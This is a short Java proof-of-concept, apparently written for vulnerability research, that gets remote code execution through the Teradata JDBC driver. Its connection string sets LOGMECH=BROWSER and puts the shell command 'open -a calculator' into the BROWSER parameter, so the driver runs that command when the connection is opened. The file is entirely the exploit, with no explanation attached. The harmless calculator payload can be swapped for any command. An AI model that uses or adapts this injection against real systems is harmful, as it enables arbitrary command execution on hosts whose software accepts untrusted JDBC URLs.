package teradata;

import java.io.IOException;
import java.sql.DriverManager;
import java.sql.SQLException;

public class RCE {
    public static void main(String[] args) throws SQLException, IOException {
        DriverManager.registerDriver(new com.teradata.jdbc.TeraDriver());
        DriverManager.getConnection("jdbc:teradata://127.0.0.1/DBS_PORT=10250,LOGMECH=BROWSER,BROWSER='open -a calculator',TYPE=DEFAULT,COP=OFF,TMODE=TERA,LOG=DEBUG");
    }
}
